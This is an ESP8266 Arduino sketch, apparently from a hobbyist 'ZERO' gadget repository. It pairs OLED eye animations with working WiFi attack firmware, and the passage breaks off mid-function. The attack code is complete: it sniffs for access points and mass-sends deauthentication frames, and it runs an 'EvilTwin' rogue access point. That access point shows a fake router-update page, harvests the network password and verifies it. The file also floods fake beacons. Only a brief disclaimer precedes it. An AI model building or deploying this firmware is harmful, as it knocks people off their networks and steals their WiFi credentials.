///THIS CODE IS WITHOUT ANY WARRANTY DON'T USE ON UNAUTH0RIZERD NETWORKES 
// INCLUDE PATH TO THIS REPO AS CREDITS ON USE
//https://github.com/ANANDHUAJITH/ZERO-V1

#include <Wire.h>
#include <RTClib.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#define SCREEN_WIDTH 128 // OLED display width, in pixels
#define SCREEN_HEIGHT 64 // OLED display height, in pixels
#ifdef ESP8266
extern "C" {
#include "ets_sys.h"
#include "osapi.h"
#include "gpio.h"
#include "os_type.h"
#include "user_config.h"
#include "user_interface.h"
}
#endif
#define OLED_RESET 0  // GPIO0
#define LOGO16_GLCD_HEIGHT 16
#define LOGO16_GLCD_WIDTH  16
char days[7][12] = {"SUN", "MON", "TUE", "WED", "THU", "FRI", "SAT"};
char months[12][4] = {"Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"};
int ref_eye_height = 40;
int ref_eye_width = 40;
int ref_space_between_eye = 10;
int ref_corner_radius = 10;
int sleeptimer = 10000;
// Current state of the eyes
int left_eye_height = ref_eye_height;
int left_eye_width = ref_eye_width;
int left_eye_x = 32;
int left_eye_y = 32;
int right_eye_x = 32 + ref_eye_width + ref_space_between_eye;
int right_eye_y = 32;
int right_eye_height = ref_eye_height;
int right_eye_width = ref_eye_width;

int *flag = 0;



DS1307 rtc; // create an RTC object

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1); // create object of ssd1306 -1 no hardware reset pin
// SCL GPIO5
// SDA GPIO4

// this idea worked
// FOR REMOVING ARRAY ITEM..
// SWITCH LAST ITEM WITH REMOVEABLE ITEM,
// REMOVE THE REMOVABLE ITEM FROM THE END,
// current--

const int size_lim = 50; // NUMBER OF ACCESS POINTS ALLOWED
const int channel_lim = 14; // NUMBER OF CHANNELS
int current = -1; // CURRENT NUMBER OF APs FOUND
int longest_essid = 0; // LENGTH OF THE LONGEST ESSID
int set_channel = 1; // STARTING CHANNEL
int channels[channel_lim] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14}; // LIST OF CHANNELS
//int channels[channel_lim] = {1, 11};
 
struct RxControl
{
  signed rssi: 8;
  unsigned rate: 4;
  unsigned is_group: 1;
  unsigned: 1;
  unsigned sig_mode: 2;
  unsigned legacy_length: 12;
  unsigned damatch0: 1;
  unsigned damatch1: 1;
  unsigned bssidmatch0: 1;
  unsigned bssidmatch1: 1;
  unsigned MCS: 7;
  unsigned CWB: 1;
  unsigned HT_length: 16;
  unsigned Smoothing: 1;
  unsigned Not_Sounding: 1;
  unsigned: 1;
  unsigned Aggregation: 1;
  unsigned STBC: 2;
  unsigned FEC_CODING: 1;
  unsigned SGI: 1;
  unsigned rxend_state: 8;
  unsigned ampdu_cnt: 8;
  unsigned channel: 4;
  unsigned: 12;
};
 
struct LenSeq
{
  uint16_t length;
  uint16_t seq;
  uint8_t address3[6];
};
 
struct sniffer_buf
{
  struct RxControl rx_ctrl;
  uint8_t buf[36];
  uint16_t cnt;
  struct LenSeq lenseq[1];
};
 
struct sniffer_buf2
{
  struct RxControl rx_ctrl;
  uint8_t buf[112];
  uint16_t cnt;
  uint16_t len;
};
unsigned long time_ = 0;
unsigned long deauth_time = 0;
unsigned long deauth_cycle = 60000;

// CLASS TO BUILD ACCESS POINT OBJECTS
class AccessPoint
{
  public:
    String essid;
    signed rssi;
    uint8_t bssid[6];
    bool lim_reached = false;
    bool found = false; // VARIABLE FOR RE-SCAN
    int channel;
    int packet_limit = 500;
    int channels[14] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}; // ARRAY TO HELP DETERMINE ACTIVE CHANNEL
    // ARRAY TO STORE CLIENTS
    // int clients[20][6] = {};
    // THANKS spacehuhn
    uint8_t deauthPacket[26] = {
      /*  0 - 1  */ 0xC0, 0x00, //type, subtype c0: deauth (a0: disassociate)
      /*  2 - 3  */ 0x00, 0x00, //duration (SDK takes care of that)
      /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,//reciever (target)
      /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //source (ap)
      /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //BSSID (ap)
      /* 22 - 23 */ 0x00, 0x00, //fragment & squence number
      /* 24 - 25 */ 0x01, 0x00 //reason code (1 = unspecified reason)
    };
};

AccessPoint access_points[size_lim];

void send_deauth(AccessPoint access_point)
{
  // SET CHANNEL TO AP CHANNEL
  wifi_set_channel(access_point.channel);
  delay(1);
  
  // SEND DEAUTH PACKET
  wifi_send_pkt_freedom(access_point.deauthPacket, 26, 0);
}

// FUNCTION TO ADD NEW APs TO THE MASTER LIST OF APs
bool add_access_point(uint8_t bssid[6], int channel, String essid, signed rssi)
{
  bool limit_reached = false;
  bool found = false;
  bool byte_match;
  int largest = 0;

  // CHECK IF WE ALREADY HAVE THE ACCESS POINT
  for (int i = 0; i < current + 1; i++)
  {
    byte_match = false;
    for (int p = 0; p < 6; p++)
    {
      if (access_points[i].bssid[p] == bssid[p])
        byte_match = true;
      else
      {
        byte_match = false;
        break;
      }
    }

    // IF WE GET A REPEAT BEACON, UPDATE ITS OBJECT
    if (byte_match == true)
    {
      // MARK IT AS FOUND
      access_points[i].found = true;
      if (access_points[i].lim_reached == false)
      {
        access_points[i].channels[channel - 1]++;
        if (access_points[i].channels[channel - 1] >= access_points[i].packet_limit)
        {
          access_points[i].lim_reached = true;
        }
        for (int c = 1; c < 15; c++)
        {
          if (access_points[i].channels[c - 1] >= access_points[i].channels[largest])
          {
            largest = c - 1;
          }
        }
        if (access_points[i].channel != largest + 1)
        {
          access_points[i].channel = largest + 1;
          Serial.print(access_points[i].essid);
          Serial.print(" -> Updated channel: ");
          Serial.println(access_points[i].channel);
        }
      }
      found = true;
      break;
    }
  }

  // IF THE ACCESS POINT WASN'T ALREADY THERE, ADD IT
  if (found == true)
    return false;
  else
  {
    // BUILD THE OBJECT
    current++;
    if (current == size_lim)
      current = 0;
      
    AccessPoint access_point;
    access_point.channel = channel;
    access_point.channels[channel - 1]++;
    access_point.essid = essid;
    access_point.rssi = rssi;
    access_point.found = true;
    for (int i = 0; i < 6; i++)
    {
      access_point.bssid[i] = bssid[i];
      access_point.deauthPacket[i + 10] = bssid[i];
      access_point.deauthPacket[i + 16] = bssid[i];
    }
    access_points[current] = access_point;

    if (access_point.essid.length() > longest_essid)
      longest_essid = access_point.essid.length();
    
    return true;
  }
}

// FUNCTION TO PRINT THE FULL LIST OF ACCESS POINTS
// EVERY TIME A NEW ONE IS ADDED
void print_aps()
{
  
  Serial.println("-----------------------------");

  
  for (int i = 0; i < current + 1; i++)
  {
    for (int x = 0; x < longest_essid - access_points[i].essid.length(); x++)
      Serial.print(" "); 
    Serial.print(access_points[i].essid);
    Serial.print(" -> ");
    for (int p = 0; p < 6; p++)
    {
      if (p != 5)
        Serial.printf("%02x ", access_points[i].bssid[p]);
      else
        Serial.printf("%02x", access_points[i].bssid[p]);
    }
    Serial.print(" | CH: ");
    Serial.print(access_points[i].channel);
    Serial.print(" | RSSI: ");
    Serial.printf("%2d | ", access_points[i].rssi);
    for (int c = 0; c < 14; c++)
    {
      Serial.print(access_points[i].channels[c]);
      Serial.print(", ");
    }
    Serial.print("\n");
  }
  Serial.println("-----------------------------");
}
 
// SNIFFER CALLBACK FUNCTION
void ICACHE_FLASH_ATTR promisc_cb(uint8 *buf, uint16 len)
{
  bool limit_reached = false;
  bool found = false;
  bool byte_match;
  int largest = 0;
  
  // CONTROL
  String local_essid = "";
  
  if (len == 12)
    struct RxControl *sniffer = (struct RxControl*) buf;
  
  // I GUESS THIS IS BEACON LENGTH
  else if (len == 128) // 173 or 37
  { 
    bool beacons = true;

    struct sniffer_buf2 *sniffer = (struct sniffer_buf2*) buf;

    if (sniffer->buf[0] == 0x80)
    {
      // LOAD BSSID OF PACKET
      uint8_t byte_arr[6];
      for (int i = 0; i < 6; i++)
      {
        byte_arr[i] = sniffer->buf[i + 10];
      }

      for (int i = 0; i < sniffer->buf[37]; i++)
        local_essid.concat((char)sniffer->buf[i + 38]);
        
      if (add_access_point(byte_arr, set_channel, local_essid, sniffer->rx_ctrl.rssi))
      {
        Serial.print("Beacon -> ");

  
        // BEACON SIZE BYTE IS LOCATED AT 37
        // BEACON ESSID STARTS AT BYTE 38
        for (int i = 0; i < sniffer->buf[37]; i++)
        {
          // PRINT THE ESSID HEX CONVERTED TO CHAR
          Serial.print((char)sniffer->buf[i + 38]);
        }
        Serial.print("\n");
        //print_aps();
      }
    }

  }

  // THIS IS DATA
  else
  {
    struct sniffer_buf *sniffer = (struct sniffer_buf*) buf;
    
    // CHECK IF WE ALREADY HAVE THE ACCESS POINT
    for (int i = 0; i < current + 1; i++)
    {
      byte_match = false;

      // CHECK IF SOURCE IS AP
      for (int p = 0; p < 6; p++)
      {
        if (access_points[i].bssid[p] == sniffer->buf[p + 10])
          byte_match = true;
        else
        {
          byte_match = false;
          break;
        }
      }

      // CHECK IF DESTINATION IS AP
      for (int p = 0; p < 6; p++)
      {
        if (access_points[i].bssid[p] == sniffer->buf[p + 4])
          byte_match = true;
        else
        {
          byte_match = false;
          break;
        }
      }
  
      // IF WE GET A REPEAT BEACON, UPDATE ITS OBJECT
      if (byte_match == true)
      {
        if (access_points[i].lim_reached == false)
        {
          access_points[i].channels[set_channel - 1]++;
          if (access_points[i].channels[set_channel - 1] >= access_points[i].packet_limit)
          {
            access_points[i].lim_reached = true;
          }
        }
      }
    }
  }
  /*
  else
  {
    struct sniffer_buf *sniffer = (struct sniffer_buf*) buf;

    Serial.printf("%02x | ", sniffer->buf[0]);

    // PRINT SOURCE ADDR
    for (int p = 0; p < 6; p++)
    {
      Serial.printf("%02x ", sniffer->buf[p + 10]);
    }

    Serial.print(" -> ");

    // PRINT DEST ADDR
    for (int p = 0; p < 6; p++)
    {
      Serial.printf("%02x ", sniffer->buf[p + 4]);
    }
    
    Serial.printf(" || RSSI: %2d (%d ms)\n", sniffer->rx_ctrl.rssi, millis() - time_);
    time_ = millis();
  }
  */
}

// FUNCTION TO SHOW THE DEAUTH PACKETS THAT WILL BE TRANSMITTED
void show_deauth()
{
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("\nAttacking");
  display.print("APs: ");
  display.print(current + 1);
  display.display();
  
  Serial.print("Deauthenticating clients from ");
  Serial.print(current + 1);
  Serial.println(" access points");
  Serial.println("-----------------------------");
  for (int i = 0; i <= current; i++)
  {
    Serial.print(access_points[i].channel);
    Serial.print(" | ");
    Serial.print(access_points[i].essid);
    Serial.print(" -> ");
    for (int p = 0; p < 6; p++)
      Serial.printf("%02x ", access_points[i].deauthPacket[p + 10]);
    Serial.print("\n");
  }
  Serial.println("-----------------------------");
}

// VOID TO MOVE DEAD AP TO END OF LIST AND ADJUST CURRENT
void remove_element(int index)
{
  AccessPoint temp = access_points[index];
  Serial.print("[!] Not found in scan | Removing -> ");
  Serial.println(temp.essid);
  access_points[index] = access_points[current];
  access_points[current] = temp;
  current--;
  Serial.print("[!] New Current -> ");
  Serial.println(current);
}

void clean_ap_list()
{
  Serial.println("[!] Cleaning AP list...");
  for (int i = 0; i <= current; i++)
  {
    if (access_points[i].found == false)
      remove_element(i);
  }
}

// FUNCTION TO SCAN FOR ACCESS POINTS
void scan()
{
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(promisc_cb);
  wifi_promiscuous_enable(1);
  Serial.println("[!] Scanning for APs...");

  for (int i = 0; i <= current; i++)
    access_points[i].found = false;
  
  for (int i = 0; i < 2; i++)
  {
    for (int p = 0; p < channel_lim; p++)
    {
      set_channel = channels[p];
      wifi_set_channel(set_channel);
      
      display.clearDisplay();
      display.setCursor(0,0);
      display.println("\nScanning..");
      display.print("Ch: ");
      display.println(channels[p]);
      display.display();
      
      delay(1000);
    }
    Serial.println("[!] Completed one scan");
  }
  Serial.println("[!] Done scanning");
  clean_ap_list();
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(0);
  wifi_promiscuous_enable(1);
}
 

// CYCLE THROUGH CHANNELS IN THE MAIN LOOP
void loop_deauth(){
/*
  if (set_channel > 14)
    set_channel = 1;
  wifi_set_channel(set_channel);
  delay(2000);
  set_channel++;
*/
  if (millis() - deauth_time > deauth_cycle)
  {
    Serial.print("Deauth ");
    Serial.print(deauth_cycle);
    Serial.println("ms mark");
    scan();
    show_deauth();
    deauth_time = millis();
  }
  for (int i = 0; i <= current; i++)
    send_deauth(access_points[i]);
  //Serial.println("Deauthed");
  delay(1);

}
typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
}  _Network;


const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}

String _correct = "";
String _tryPassword = "";

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }

      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

bool hotspot_active = false;
bool deauthing_active = false;

void handleResult() {
  String html = "";
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Wrong Password</h2><p>Please, try again.</p></body> </html>");
    Serial.println("Wrong password tried !");
  } else {
    webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Good password</h2></body> </html>");
    hotspot_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect (true);
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
    WiFi.softAP("zero", "deauther");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    Serial.println("Good password was entered !");
    Serial.println(_correct);
  }
}
String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<style> .content {max-width: 500px;margin: auto;}table, th, td {border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style>"
                   "</head><body><div class='content'>"
                   "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
                   "<button style='display:inline-block;'{disabled}>{deauth_button}</button></form>"
                   "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
                   "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
                   "</div></br><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";

void handleIndex() {

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("zero", "deauther");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if ( _networks[i].ssid == "") {
        break;
      }
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
      } else {
        _html += "<button>Select</button></form></td></tr>";
      }
    }

    if (deauthing_active) {
      _html.replace("{deauth_button}", "Stop deauthing");
      _html.replace("{deauth}", "stop");
    } else {
      _html.replace("{deauth_button}", "Start deauthing");
      _html.replace("{deauth}", "start");
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "Stop EvilTwin");
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "Start EvilTwin");
      _html.replace("{hotspot}", "start");
    }


    if (_selectedNetwork.ssid == "") {
      _html.replace("{disabled}", " disabled");
    } else {
      _html.replace("{disabled}", "");
    }

    _html += "</table>";

    if (_correct != "") {
      _html += "</br><h3>" + _correct + "</h3>";
    }

    _html += "</div></body></html>";
    webServer.send(200, "text/html", _html);

  } else {

    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><h2>Updating, please wait...</h2></body> </html>");
    } else {
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><body><h2>Router '" + _selectedNetwork.ssid + "' needs to be updated</h2><form action='/'><label for='password'>Password:</label><br>  <input type='text' id='password' name='password' value='' minlength='8'><br>  <input type='submit' value='Submit'> </form> </body> </html>");
    }
  }

}

void handleAdmin() {

  String _html = _tempHTML;

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("zero", "deauther");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  for (int i = 0; i < 16; ++i) {
    if ( _networks[i].ssid == "") {
      break;
    }
    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" +  bytesToStr(_networks[i].bssid, 6) + "'>";

    if ( bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
      _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
    } else {
      _html += "<button>Select</button></form></td></tr>";
    }
  }

  if (deauthing_active) {
    _html.replace("{deauth_button}", "Stop deauthing");
    _html.replace("{deauth}", "stop");
  } else {
    _html.replace("{deauth_button}", "Start deauthing");
    _html.replace("{deauth}", "start");
  }

  if (hotspot_active) {
    _html.replace("{hotspot_button}", "Stop EvilTwin");
    _html.replace("{hotspot}", "stop");
  } else {
    _html.replace("{hotspot_button}", "Start EvilTwin");
    _html.replace("{hotspot}", "start");
  }


  if (_selectedNetwork.ssid == "") {
    _html.replace("{disabled}", " disabled");
  } else {
    _html.replace("{disabled}", "");
  }

  if (_correct != "") {
    _html += "</br><h3>" + _correct + "</h3>";
  }

  _html += "</table></div></body></html>";
  webServer.send(200, "text/html", _html);

}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

void loop_ev() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && millis() - deauth_now >= 1000) {

    wifi_set_channel(_selectedNetwork.ch);

    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};

    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;

    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xC0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xA0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));

    deauth_now = millis();
  }

  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println("BAD");
    } else {
      Serial.println("GOOD");
    }
    wifinow = millis();
  }
}

///



String ssid = "1234567890qwertyuiopasdfghjkklzxcvbnm QWERTYUIOPASDFGHJKLZXCVBNM_";
byte channel;

uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00, 
                        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
                        0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
                        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 
                        0xc0, 0x6c, 
                        0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 
                        0x64, 0x00, 
                        0x01, 0x04, 
                
                        0x00, 0x06, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72,
                        0x01, 0x08, 0x82, 0x84,
                        0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, 
                        0x04};                       


void loop_beacon() { 
    channel = random(1,12); 
    wifi_set_channel(channel);

    packet[10] = packet[16] = random(256);
    packet[11] = packet[17] = random(256);
    packet[12] = packet[18] = random(256);
    packet[13] = packet[19] = random(256);
    packet[14] = packet[20] = random(256);
    packet[15] = packet[21] = random(256);

  
    String baseSsid = "zero";
    for (int i = 0; i < 3; i++) { // Append 3 random characters from ssid
        baseSsid += ssid[random(65)];
    }

    // Convert baseSsid to char array
    char charBufSsid[33];
    baseSsid.toCharArray(charBufSsid, 33);

    int ssidLen = strlen(charBufSsid);

    // Update SSID length and content in the packet
    packet[37] = ssidLen;

    for (int i = 0; i < ssidLen; i++) {
        packet[38 + i] = charBufSsid[i];
    }

    packet[56] = channel;
    
    // Send packet multiple times for broadcasting
    wifi_send_pkt_freedom(packet, 57, 0);
    wifi_send_pkt_freedom(packet, 57, 0);
    wifi_send_pkt_freedom(packet, 57, 0);
    delay(1);
}

void draw_eyes(bool update = true)
{
    display.clearDisplay();
    // draw from center
    int x = int(left_eye_x - left_eye_width / 2);
    int y = int(left_eye_y - left_eye_height / 2);
    display.fillRoundRect(x, y, left_eye_width, left_eye_height, ref_corner_radius, SSD1306_WHITE);
    x = int(right_eye_x - right_eye_width / 2);
    y = int(right_eye_y - right_eye_height / 2);
    display.fillRoundRect(x, y, right_eye_width, right_eye_height, ref_corner_radius, SSD1306_WHITE);
    if (update)
    {
        display.display();
    }
}

void center_eyes(bool update = true)
{
    // move eyes to the center of the display, defined by SCREEN_WIDTH, SCREEN_HEIGHT
    left_eye_height = ref_eye_height;
    left_eye_width = ref_eye_width;
    right_eye_height = ref_eye_height;
    right_eye_width = ref_eye_width;

    left_eye_x = SCREEN_WIDTH / 2 - ref_eye_width / 2 - ref_space_between_eye / 2;
    left_eye_y = SCREEN_HEIGHT / 2;
    right_eye_x = SCREEN_WIDTH / 2 + ref_eye_width / 2 + ref_space_between_eye / 2;
    right_eye_y = SCREEN_HEIGHT / 2;

    draw_eyes(update);
}

void blink(int speed = 12)
{
    draw_eyes();

    for (int i = 0; i < 3; i++)
    {
        left_eye_height = left_eye_height - speed;
        right_eye_height = right_eye_height - speed;
        draw_eyes();
        delay(1);
    }
    for (int i = 0; i < 3; i++)
    {
        left_eye_height = left_eye_height + speed;
        right_eye_height = right_eye_height + speed;

        draw_eyes();
        delay(1);
    }
}

void sleep()
{
    left_eye_height = 2;
    right_eye_height = 2;
    draw_eyes(true);
}

void wakeup()
{
    sleep();

    for (int h = 0; h <= ref_eye_height; h += 2)
    {
        left_eye_height = h;
        right_eye_height = h;
        draw_eyes(true);
    }
}

void happy_eye()
{
    center_eyes(false);
    // draw inverted triangle over eye lower part
    int offset = ref_eye_height / 2;
    for (int i = 0; i < 10; i++)
    {
        display.fillTriangle(left_eye_x - left_eye_width / 2 - 1, left_eye_y + offset, left_eye_x + left_eye_width / 2 + 1, left_eye_y + 5 + offset, left_eye_x - left_eye_width / 2 - 1, left_eye_y + left_eye_height + offset, SSD1306_BLACK);

        display.fillTriangle(right_eye_x + right_eye_width / 2 + 1, right_eye_y + offset, right_eye_x - left_eye_width / 2 - 1, right_eye_y + 5 + offset, right_eye_x + right_eye_width / 2 + 1, right_eye_y + right_eye_height + offset, SSD1306_BLACK);

        offset -= 2;
        display.display();
        delay(1);
    }

    display.display();
    delay(1000);
}

void saccade(int direction_x, int direction_y)
{
    // quick movement of the eye, no size change. stay at position after movement, will not move back, call again with opposite direction
    // direction == -1 :  move left
    // direction == 1 :  move right

    int direction_x_movement_amplitude = 8;
    int direction_y_movement_amplitude = 6;
    int blink_amplitude = 8;

    for (int i = 0; i < 1; i++)
    {
        left_eye_x += direction_x_movement_amplitude * direction_x;
        right_eye_x += direction_x_movement_amplitude * direction_x;
        left_eye_y += direction_y_movement_amplitude * direction_y;
        right_eye_y += direction_y_movement_amplitude * direction_y;

        right_eye_height -= blink_amplitude;
        left_eye_height -= blink_amplitude;
        draw_eyes();
        delay(1);
    }

    for (int i = 0; i < 1; i++)
    {
        left_eye_x += direction_x_movement_amplitude * direction_x;
        right_eye_x += direction_x_movement_amplitude * direction_x;
        left_eye_y += direction_y_movement_amplitude * direction_y;
        right_eye_y += direction_y_movement_amplitude * direction_y;

        right_eye_height += blink_amplitude;
        left_eye_height += blink_amplitude;

        draw_eyes();
        delay(1);
    }
}

void move_right_big_eye()
{
    move_big_eye(1);
}

void move_left_big_eye()
{
    move_big_eye(-1);
}

void move_big_eye(int direction)
{
    // direction == -1 :  move left
    // direction == 1 :  move right

    int direction_oversize = 1;
    int direction_movement_amplitude = 2;
    int blink_amplitude = 5;

    for (int i = 0; i < 3; i++)
    {
        left_eye_x += direction_movement_amplitude * direction;
        right_eye_x += direction_movement_amplitude * direction;
        right_eye_height -= blink_amplitude;
        left_eye_height -= blink_amplitude;
        if (direction > 0)
        {
            right_eye_height += direction_oversize;
            right_eye_width += direction_oversize;
        }
        else
        {
            left_eye_height += direction_oversize;
            left_eye_width += direction_oversize;
        }

        draw_eyes();
        delay(1);
    }
    for (int i = 0; i < 3; i++)
    {
        left_eye_x += direction_movement_amplitude * direction;
        right_eye_x += direction_movement_amplitude * direction;
        right_eye_height += blink_amplitude;
        left_eye_height += blink_amplitude;
        if (direction > 0)
        {
            right_eye_height += direction_oversize;
            right_eye_width += direction_oversize;
        }
        else
        {
            left_eye_height += direction_oversize;
            left_eye_width += direction_oversize;
        }
        draw_eyes();
        delay(1);
    }

    delay(1000);

    for (int i = 0; i < 3; i++)
    {
        left_eye_x -= direction_movement_amplitude * direction;
        right_eye_x -= direction_movement_amplitude * direction;
        right_eye_height -= blink_amplitude;
        left_eye_height -= blink_amplitude;
        if (direction > 0)
        {
            right_eye_height -= direction_oversize;
            right_eye_width -= direction_oversize;
        }
        else
        {
            left_eye_height -= direction_oversize;
            left_eye_width -= direction_oversize;
        }
        draw_eyes();
        delay(1);
    }
    for (int i = 0; i < 3; i++)
    {
        left_eye_x -= direction_movement_amplitude * direction;
        right_eye_x -= direction_movement_amplitude * direction;
        right_eye_height += blink_amplitude;
        left_eye_height += blink_amplitude;
